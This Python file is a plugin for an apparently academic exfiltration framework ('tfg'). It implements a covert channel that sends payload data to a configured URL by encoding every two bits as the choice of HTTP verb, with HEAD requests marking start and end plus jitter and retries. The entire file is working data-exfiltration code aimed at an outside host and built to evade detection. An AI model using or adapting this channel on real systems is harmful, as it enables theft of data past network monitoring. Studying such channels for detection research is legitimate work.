from __future__ import annotations
from typing import Dict, Any, Iterable
import urllib.request, urllib.error
import time, random

from tfg.plugins.api import ExfilClientPlugin

VERB_MAP = {0b00: "GET", 0b01: "POST", 0b10: "PUT", 0b11: "DELETE"}


class HttpClientVerbSeq(ExfilClientPlugin):
    canal = "HTTP"
    metodo = 2
    name = "http_client_verb_seq"

    def _req(self, url: str, method: str, headers: dict, timeout: int, retries: int, backoff_ms: int) -> None:
        last_exc: Exception | None = None
        for attempt in range(retries + 1):
            try:
                req = urllib.request.Request(url=url, data=None, headers=headers, method=method)
                with urllib.request.urlopen(req, timeout=timeout) as _:
                    return
            except Exception as e:
                last_exc = e
                if attempt >= retries:
                    break
                time.sleep(((2 ** attempt) * backoff_ms) / 1000.0)
        raise last_exc  # type: ignore

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        url = config.get("url")
        if not url:
            raise ValueError("Falta 'url' en config para HttpClientVerbSeq")
        exfil_id   = config.get("exfil_id") or str(int(time.time() * 1000))
        timeout    = int(config.get("timeout_s") or 10)
        user_agent = config.get("user_agent") or "TFG-Exfil/1.1"
        auth_token = config.get("auth_token")
        retries    = int(config.get("retries") or 3)
        backoff_ms = int(config.get("retry_backoff_ms") or 250)
        ritmo_base = int(config.get("ritmo_base_ms") or 0)
        ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)

        data = b"".join(payload_iter)
        total_bytes = len(data)

        def base_hdrs() -> dict:
            h = {"User-Agent": user_agent, "X-Exfil-Id": exfil_id}
            if auth_token:
                h["X-Auth-Token"] = auth_token
            return h

        # 1) Handshake inicial: anuncia el total de bytes
        h = base_hdrs()
        h["X-Exfil-Start"] = "1"
        h["X-Exfil-Bytes"] = str(total_bytes)
        self._req(url, "HEAD", h, timeout, retries, backoff_ms)

        # 2) Enviar símbolos: cada byte → 4 verbos (2 bits por verbo, MSB primero)
        seq = 0
        for byte_val in data:
            for shift in (6, 4, 2, 0):
                bits = (byte_val >> shift) & 0b11
                verb = VERB_MAP[bits]
                if ritmo_base or ritmo_disp:
                    jitter = random.uniform(-ritmo_disp, ritmo_disp)
                    time.sleep(max(0.0, (ritmo_base + jitter) / 1000.0))
                h = base_hdrs()
                h["X-Exfil-Seq"] = str(seq)
                self._req(url, verb, h, timeout, retries, backoff_ms)
                seq += 1

        # 3) EOT
        h = base_hdrs()
        h["X-Exfil-Last"] = "1"
        self._req(url, "HEAD", h, timeout, retries, backoff_ms)

        return {
            "ok": True,
            "plugin": self.name,
            "exfil_id": exfil_id,
            "sent_bytes": total_bytes,
            "sent_symbols": seq,
        }
